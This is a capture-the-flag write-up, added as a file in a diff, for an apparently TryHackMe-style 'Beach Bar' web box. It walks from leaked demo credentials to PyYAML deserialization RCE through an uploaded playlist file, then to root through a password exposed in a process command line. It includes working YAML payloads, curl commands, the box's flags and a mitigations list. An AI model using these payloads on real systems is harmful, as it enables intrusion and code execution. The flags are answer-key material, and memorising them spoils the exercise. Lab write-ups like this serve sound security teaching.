@@ -1,0 +1,157 @@
+================================================================================
+CTF WRITE-UP
+Beach Bar (DJ booth / jukebox) - Web RCE + Credential Reuse
+Target     : http://10.48.157.162
+Difficulty : Medium-ish (web RCE -> low priv -> root)
+User flag  : THM{y4ml_pl4yl1st_pwns_th3_b34ch}
+Root flag  : THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
+================================================================================
+
+SUMMARY OF THE ATTACK CHAIN
+---------------------------
+1. Recon the web app -> a Flask app called "Beach Bar" (gunicorn).
+2. The /login page contains an HTML comment leaking demo creds: dj / dj.
+3. Authenticate as dj, find /import which accepts YAML (paste or upload).
+4. /import uses unsafe yaml.load(Loader=yaml.Loader) on the uploaded file
+   -> PyYAML deserialization gives remote code execution as "bartender".
+5. Read /home/bartender/user.txt -> USER FLAG.
+6. ps aux shows a root process: jukeboxd.py --stream-pass SunsetSpritz2024!
+7. That leaked value is also the root password:  su root  works.
+8. Read /root/root.txt -> ROOT FLAG.
+
+================================================================================
+PART 1 - RECON
+================================================================================
+
+* Root / requires auth (302 to /login).
+
+    curl -i http://10.48.157.162/login
+
+* /login page source contains a staff note in an HTML comment:
+
+    <!--
+      staff note: the demo DJ login is still enabled for the soft opening.
+      dj / dj  -- swap this before the season starts (ticket BAR-7)
+    -->
+
+* Log in with dj / dj. A session cookie is issued:
+
+    session=eyJ1c2VyIjoiZGoifQ...     (decodes to {"user":"dj"})
+
+* After login we get nav links: Floor (/dashboard), Import (/import),
+  Export (/export).
+
+* /export just serves a static YAML playlist. /import is the interesting one:
+  it lets you paste a playlist (YAML) or upload a .yml/.yaml file.
+
+================================================================================
+PART 2 - WEB VULN: UNSAFE YAML LOAD (PyYAML DESERIALIZATION RCE)
+================================================================================
+
+* The import form accepts YAML. Testing showed the textarea path silently
+  rejected custom tags, but the FILE UPLOAD path parsed them.
+
+* Uploading a malicious .yml that uses PyYAML python object tags gives RCE:
+
+    playlist:
+      name: rce
+      test: !!python/object/apply:os.system ["id > /tmp/rce_ok"]
+
+  Response reflected:  {'playlist': {'name': 'rce', 'test': 0}}
+  -> os.system() returned 0 -> command executed on the box.
+
+* To get command OUTPUT back, use builtins.eval + os.popen and let the
+  parsed result be echoed in the page:
+
+    playlist:
+      name: rce
+      out: !!python/object/apply:builtins.eval
+           ["__import__('os').popen('id').read()"]
+
+  Result: uid=1001(bartender) gid=1001(bartender)
+
+* Root cause (from app source recovered on disk at /opt/beach-bar/webapp/app.py):
+
+    parsed = yaml.load(content, Loader=yaml.Loader)
+
+  yaml.Loader (aka UnsafeLoader) will instantiate arbitrary Python objects
+  -> classic PyYAML deserialization RCE. Should have been yaml.safe_load().
+
+================================================================================
+PART 3 - USER FLAG
+================================================================================
+
+* With RCE as bartender, read the home directory:
+
+    cat /home/bartender/user.txt
+
+  -> THM{y4ml_pl4yl1st_pwns_th3_b34ch}
+
+================================================================================
+PART 4 - PRIVESC TO ROOT (CREDENTIAL REUSE)
+================================================================================
+
+* Enumerating running processes exposed a root-owned background service:
+
+    root  609  /opt/beach-bar/venv/bin/python
+              /opt/beach-bar/jukeboxd/jukeboxd.py
+              --stream-pass SunsetSpritz2024! --bitrate 320k
+
+  The stream backend password is right there in the command line.
+
+* Ubuntu's classic mistake: that same secret is reused as the ROOT password.
+
+    echo 'SunsetSpritz2024!' | su - root -c 'id'
+    -> uid=0(root) gid=0(root) groups=0(root)
+
+* Read the root flag:
+
+    cat /root/root.txt
+    -> THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
+
+* (Optional) /etc/systemd/system/badr.service was a decoy/leftover: it
+  chmods and runs /etc/badr/badr as root then deletes it, but /etc is not
+  writable by bartender, so it was not needed for the solve.)
+
+================================================================================
+PART 5 - PAYLOADS / COMMANDS USED (QUICK REFERENCE)
+================================================================================
+
+# 1. Login
+    curl -c c.txt -X POST http://10.48.157.162/login \
+         -d "username=dj&password=dj"
+
+# 2. RCE via uploaded YAML (rce.yml)
+    playlist:
+      name: rce
+      out: !!python/object/apply:builtins.eval
+           ["__import__('os').popen('COMMAND').read()"]
+
+    curl -b c.txt -F "playlist_file=@rce.yml;type=text/yaml" \
+         http://10.48.157.162/import
+
+# 3. Read user flag
+    curl -b c.txt -F "playlist_file=@rce.yml;type=text/yaml" \
+         http://10.48.157.162/import   (COMMAND = cat /home/bartender/user.txt)
+
+# 4. Privesc
+    curl ... (COMMAND = echo 'SunsetSpritz2024!' | su - root -c 'cat /root/root.txt')
+
+================================================================================
+PART 6 - TAKEAWAYS / MITIGATIONS
+================================================================================
+
+- Never use yaml.load with an untrusted Loader. Use yaml.safe_load().
+  PyYAML python tags can execute arbitrary code during parsing.
+- Never bake credentials into a process command line
+  (--stream-pass on the CLI) -- they are visible to every local user in ps.
+- Never reuse the same password across services and the root account.
+- Remove demo/default credentials (the dj/dj login was flagged in a ticket
+  but never removed).
+- Restrict /import-style functionality to authorized users and validate
+  that uploaded file types are actually safe.
+
+FLAGS:
+  user: THM{y4ml_pl4yl1st_pwns_th3_b34ch}
+  root: THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
+================================================================================
